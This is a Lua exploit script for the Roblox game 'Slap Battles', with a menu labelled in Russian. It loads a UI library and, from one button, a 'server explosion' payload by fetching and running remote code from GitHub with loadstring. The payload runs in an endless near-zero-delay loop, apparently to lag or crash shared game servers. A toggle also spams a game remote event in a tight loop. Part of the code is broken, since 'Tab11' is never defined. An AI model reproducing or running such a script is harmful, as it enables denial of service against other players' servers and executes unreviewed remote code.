local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Bendyshechka/XenkaliScript/refs/heads/main/Library')))()
local Window = OrionLib:MakeWindow({Name = "Slap battles💀", HidePremium = false, SaveConfig = true, ConfigFolder = "Lag"})

local Tab = Window:MakeTab({
	Name = "Основное💀😈",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Взрыв сервера со слапстиком",
	Callback = function()
		while true do
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Bendyshechka/GGGLAG/refs/heads/main/slapstick.lua"))()
			wait(0.0000001)
		end
	end    
})

Tab11:AddDropdown({
	Name = "Glove Sound",
	Default = "Scythe",
	Options = {"Scythe"},
	Callback = function(Value)
GloveSound = Value
	end    
})

Tab11:AddToggle({
	Name = "Auto Spam Glove Sound",
	Default = false,
	Callback = function(Value)
		GloveSoundSpam = Value
while GloveSoundSpam and GloveSound == "Scythe" do
game:GetService("ReplicatedStorage").Scythe:FireServer("ScytheWeapon")
task.wait()
end
	end    
})
